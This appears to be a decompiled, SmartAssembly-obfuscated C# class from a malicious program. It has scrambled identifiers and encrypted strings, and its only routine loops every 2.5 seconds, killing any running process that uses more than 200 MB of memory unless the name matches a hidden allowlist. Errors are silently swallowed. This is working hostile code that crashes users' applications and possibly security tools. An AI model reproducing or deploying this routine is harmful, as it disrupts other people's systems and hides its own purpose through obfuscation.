using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GlIxuPPoosXGy;

public static class eBvBjzDrSadgKm
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void elsdDIOXQDDCc()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401648)) && !process.ProcessName.Contains(getString_0(107401639)) && !process.ProcessName.Contains(getString_0(107401662)) && !process.ProcessName.Contains(getString_0(107401653)) && !process.ProcessName.Contains(getString_0(107401608)) && !process.ProcessName.Contains(getString_0(107401627)) && !process.ProcessName.Contains(getString_0(107401582)) && !process.ProcessName.Contains(getString_0(107401601)) && !process.ProcessName.Contains(getString_0(107401588)) && !process.ProcessName.Contains(getString_0(107401543)) && !process.ProcessName.Contains(getString_0(107401554)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static eBvBjzDrSadgKm()
	{
		Strings.CreateGetStringDelegate(typeof(eBvBjzDrSadgKm));
	}
}
